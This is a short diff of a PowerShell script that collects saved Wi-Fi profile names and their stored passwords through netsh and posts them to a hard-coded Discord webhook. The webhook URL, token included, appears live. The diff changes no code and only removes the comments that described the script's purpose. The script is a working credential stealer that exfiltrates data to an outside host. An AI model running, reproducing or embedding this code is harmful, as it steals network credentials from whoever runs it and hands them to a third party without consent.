@@ -1,5 +1,3 @@
-# Lists saved Wi-Fi profiles using netsh
-# Extracts SSID names and stored keys (if available)
 $profiles = (netsh wlan show profiles) |
     Select-String "\:(.+)$" |
     ForEach-Object { $name=$_.Matches.Value.TrimStart(": "); $name } |
@@ -7,7 +5,6 @@ $profiles = (netsh wlan show profiles) |
     Select-String "SSID name|Key Content"
 
 
-# Formats results into a message
 $message = "Saved Wi-Fi profiles:`n" + ($profiles -join "`n")
 
 $body = @{
@@ -15,7 +12,6 @@ $body = @{
 } | ConvertTo-Json
 
 
-# Sends results to a Discord webhook
 Invoke-RestMethod `
 
     -Uri "https://discord.com/api/webhooks/1510389267241631754/bsEM-H8cxl_Cu7o8Kj5-rOCXAxzMdme_WKZI2vKN3vDCTMKQo5pxT5MT34YYXInQQlpT" `
